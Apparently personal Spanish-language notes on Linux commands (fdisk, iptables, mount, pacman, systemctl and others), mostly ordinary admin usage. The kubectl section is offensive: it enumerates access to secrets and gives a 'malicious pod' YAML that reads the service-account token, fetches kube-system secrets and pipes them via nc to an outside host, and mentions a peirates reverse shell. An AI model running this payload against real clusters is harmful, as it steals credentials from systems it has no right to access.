---
layout: default
---
<h1>./issk.sh 2>/dev/null &;disown</h1>

## Apuntes: Comandos de control y sistema
----------------------------------------------
### blkid
Esta herramienta sirve para filtrar por el tipo de partición 
ext4 etc...

### cfdisk
Es muy comoda para maniobrar con particiones borrar, crear elegir tipo.
porque tiene una interfaz en la terminal.
Por default selecciona /dev/sda es algo que tenemos que tener presente para
no hacer cambios indeseados.

### command 
Es como which, para enumerar los comandos disponibles

`command -v curl`

### df
con esta herramienta podras ver las monturas del equipo al igual que podras ver los dispositivos de almacenamiento
del equipo.

df -h 

### disown 
Es para independizar desde la terminal un proceso, de esta manera
si cierras la terminal no se morira el proceso.

### fdisk
Para ver información respectiva de particiones y dispositivos de almacenamiento. 

`sudo fdisk -l` 

También su función es crear particiones, se hace de la siguiente manera:

`fdisk /dev/sda`
```
d ver si tienes partición
o crear tabla de partición
n crear partición
	 p e primaria y extendida. enter enter...
w guardar
```
### iptables
Esta herramienta sirve para configurar reglas de red.
```bash
iptables -L 
#Te muestra las reglas que ya tienes.

iptables -t nat -L 
#te muestra las teglas de nat

iptables -t nat -A -PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

#Con esto rediriges los paquetes que entran por el puerto 80 a el puerto 8080, que estará a la escucha.

iptables -F 
#Limpias las tablas de reglas.
```
los archivos de configuracion rules.v4 y rules.v6 
se encuentran en /etc/iptables estos archivos muestra la
información de las reglas configuradas.

### iwctl
Te permite conectarte al wifi por la terminal.

Ejemplo:
```bash
iwctl --passphrase AdQXcwed station wlan0 connect MIWIFI_GCJp
```

### journalctl
Es un comando que te permite gestionar más a fondo los procesos 
de los servicios.
Esto es debido a que podemos ver los logs de los servicios.
```bash
journalctl -u service  #ver la informacion del servicio tras un fallo
journalctl -xeu reser.service #ver informacion muchos mas detallada
```
### killall
Matar multiples procesos con el mismo nombre.

#Ejemplo para matar todos los procesos de openvpn  
	
`sudo killall openvpn`

### kubectl
```bash
kubectl auth can-i list pod
kubectl auth can-i list namespaces
kubectl auth can-i list secrets -n default #default es una namespaces que tenemos presente.

#Puede que no te deje listar ninguna de las de arriba pero si le indicas -n con el namespaces correspondiente es probable que te deje.
kubectl auth can-i get pod -n dev
kubectl auth can-i get namespaces -n kube-system
kubectl auth can-i get secrets -n dev

#Lo normal en kubectl es tener que preguntar lo suficiente hasta ganar información. 

kubectl get namespaces #En caso de decirte que si
kubectl get pod -n dev #dev es un namespaces.
kubectl get secrets -n dev

#Ver la información del pod te enseñara otro contenedor lo más probable.
kubect  describe pod/devnode-deployment-776dbcf7d6-ld62v -n dev
kubect  describe secret/admin-adpc -n dev
```
-n = namesaces

Existe una vulnerabilidad que te permite crear un `pod` malicioso 
mediante un archivo yaml como el siguiente solo que para ello
tenemos que saber el token del admin, lo normal es que se encuentre
en un `secreto` de algún `namespaces` con la sintaxis siguiente lo creas.

Tenemos que resaltar que el yaml malicioso no siempre funciona puesto a que es un archivo muy especial a la hora de que se tramite la data.
En caso de que no te funcione usamos peirates.

#peirates -t "token" ##la opcion 20 te entabla una revershell

`kubectl create -f malicious-pod.yaml --token eyEff3F4...`

malicious-pod.yaml
::::::::::::::
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://<masternode>:443/api/v1/namespaces/kube-system/secrets; } | nc -nv <somethingreachable> 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```
### loadkeys
Es para cambiar momentaneamente la asignación del idioma del teclado
`loadkeys es`

### lsblk
listar block

A diferencia de df -h este comando es capaz de 
mostrarte todos las particiones.

### lsscsi
Esta herrmienta te indica el modelo del disco duro.

### mkfs.ext4 
Es para asignar un formato a la unidad o partición.

### mount
Con mount puedes crear monturas contra una máquina pero antes tendras que ver que monturas te permite crear esa máquina para ello
utilizaremos:
 
```bash
showmount -e 10.10.10.10

showmount -ade (comando completo podriamos ver todo)

#Creamos la montura tipo nfs, desde var de la maquina objetivo hasta mi carpeta temporal
mount -t nfs 10.10.10.10:var/ /tmp/var 
```
Si utilizamos mount sin parametros nos desplegara un registro de información, con muchas rutas, desde aquí se filtra
mucha información sobre monturas ya creadas.

Existe una función para aislar los procesos de los usurios entre ellos
y para comprobar si esta habilida, solo tenemos que ejecutar el comando
mount

Nos saldran las rutas, pero en proc te mostrara un atributo llamado hidepid=2
en caso de que esté, se estaran aislando los procesos entre usuarios.

Una herramienta para montar servidores ftp:

```bash 
curlftpfs ftp://10.10.10.152 /mnt/test
#Creamos de esta manera la montura con ftp anonimo


sudo mount -t cifs //10.10.10.134/Backups /mnt/smb
#Creamos una montura con smb
```
### pacman
Es un gestor de paquetes 
instalas con pacman -S y actualizas con -U, actualizas paquetes al igual
que con -U puedes instalar los paquetes zst comprimidos.

```bash
# Buscar paquetes:
pacman -Ss <package>...

# Actualizas la base de datos de los paquetes:
pacman -Suy

# instalar paquete:
pacman -S <package>...

# Reinstalar paquete:
pacman -R <package>
```

### paru
Es un ayudante de pacman, con funciones muy parecidas, te permite 
instalar paquetes.

-S para instalar

### rfkill
Este comando te permite bloquear o desbloquear hardware y software de red
rfkill list 
#Es para ver los bloqueos o desbloqueos 
unblock 
#Desbloqueas 

### smartctl
smartctl es una herramienta que te permite ver los datos de tu disco duro 
además es muy completa pero necesita de los sistemas específicos.

`smartctl -a /dev/sda5`

### sysctl
Este comando te permite cambiar los valores de ciertas configuraciones
del sistema, por ejemplo la siguiente:

Si pones este comando podras cambiar factores del ipv6 y ipv4 
por ejemplo activar el ipv6 con...

`sysctl net.ipv6.conf.all.disable_ipv6=0`

### systemctl
 
Este comando al igual que service te permite iniciar un servicio, paralo o ver su estado.

`systemctl start tor` 

También puedes usar stop o status..

También te puede crear un autoarranque del servicio cuando enciendas el sistema simplemente
usariamos lo siguiente :

`systemctl enable tor`

también puedes usar disable

```bash
#Crear servicio 
systemctl link "ruta absoluta de archivo .service"
systemctl enable --now archivo.service

#Ejemplo real.
systemctl enable --now snapd  #Iniciar snapd

snap connect discord:system-observe 

#Esta es una manera de enlazar discord con snap en caso de que el demonio  de snap fuera previamente parado.

systemctl daemon-reload # reinicio el servicio, independientemnete de que falle o no
```

Monitorizar los procesos en tiempo real, bueno si quieres una frecuencia de actualizacion 
mas corta podriamos utilizar watch -n 1 para que cada segundo se actualize el output.
`systemctl list-timers`

![Octocat](https://github.githubassets.com/images/icons/emoji/octocat.png)

